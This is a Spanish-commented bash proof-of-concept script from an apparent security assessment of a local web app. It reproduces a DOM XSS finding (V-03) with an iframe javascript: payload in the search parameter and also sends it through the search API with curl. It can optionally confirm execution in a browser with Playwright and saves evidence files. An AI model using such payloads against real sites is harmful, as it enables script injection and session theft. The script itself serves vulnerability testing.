#!/usr/bin/env bash
# V-03 · DOM XSS en la búsqueda (frontend search-result.component.ts:146 -> [innerHTML]).
# El parámetro q se confía como HTML (bypassSecurityTrustHtml) y se ejecuta en el navegador.
set -uo pipefail
BASE_URL="${BASE_URL:-http://127.0.0.1:3000}"
HERE="$(cd "$(dirname "$0")" && pwd)"; EVID="${EVID:-$HERE/../../evidencias/h2-V-03-xss-dom-search}"; mkdir -p "$EVID"
PAYLOAD='<iframe src="javascript:alert(`xss`)">'
echo "[$(TZ=America/Guatemala date '+%Y-%m-%d %H:%M:%S %Z')] V-03 DOM XSS -> $BASE_URL"
echo "$PAYLOAD" > "$EVID/payload.txt"
echo "URL de reproducción manual (abrir en un navegador):" | tee "$EVID/repro-url.txt"
python3 -c "import urllib.parse,os;print('$BASE_URL/#/search?q='+urllib.parse.quote(open('$EVID/payload.txt').read().strip()))" | tee -a "$EVID/repro-url.txt"
# (a) rastro visible para el WAF: el mismo payload por la API de búsqueda
H=$(curl -s -G "$BASE_URL/rest/products/search" --data-urlencode "q=$PAYLOAD" -o /dev/null -w '%{http_code}')
echo "traza servidor: GET /rest/products/search?q=<payload> -> HTTP $H" | tee "$EVID/traza-servidor.txt"
# (b) ejecución real en navegador si hay Playwright
if [ -n "${PLAYWRIGHT_DIR:-}" ]; then
  if BASE_URL="$BASE_URL" EVID="$EVID" PLAYWRIGHT_DIR="$PLAYWRIGHT_DIR" node "$HERE/xss-check.js"; then
    echo "VULN CONFIRMADA (V-03): el alert('xss') se ejecutó en el navegador (ver xss-ejecutado.png, resultado.json)"
  else
    echo "El navegador no reportó ejecución (revisar resultado.json)"; fi
else
  echo "PLAYWRIGHT_DIR no definido: se omite la captura en navegador; usar la URL de reproducción manual."
fi
